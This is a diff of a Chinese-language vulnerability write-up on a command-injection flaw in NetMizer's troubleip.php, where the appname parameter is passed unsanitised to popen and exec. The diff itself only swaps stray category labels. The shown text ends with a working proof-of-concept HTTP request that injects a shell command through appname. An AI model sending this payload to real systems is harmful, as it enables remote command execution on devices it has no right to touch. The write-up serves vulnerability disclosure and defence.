@@ -20,14 +20,6 @@ NetMizer日志[管理系统](#)是一款专为网络流量管理和优化设计�
 
 # 漏洞分析
 
-深入探索
-
-博客资源与服务
-
-黑客
-
-数据格式与协议
-
 看下 `troubleip.php` 业务实现关键逻辑部分
 
 ```
@@ -52,11 +44,11 @@ else if($action == 'showtask'){
 
 深入探索
 
-blog
+网安
 
-参考信息
+操作系统
 
-Blog
+脚本语言
 
 当 `$action == 'showtask'` 时，`$appname` 直接拼接在 `$cmd_root` > `$cmd` 中带入 `popen` 执行，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
@@ -80,21 +72,13 @@ if($fp) {
 echo '{"success":true}';
 ```
 
-深入探索
-
-防病毒程序与恶意软件
-
-开发工具
-
-工程与技术
-
 `$appname` 也是直接拼接进[命令执行](https://mrxn.net/tag/rce "标签：命令执行")字符串中用 exec 来执行最终的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-字典与百科全书
+计算机科学
 
 ```
 GET /data/search/troubleip.php?action=showtask&appname=search;id+%23+&id=1 HTTP/1.1
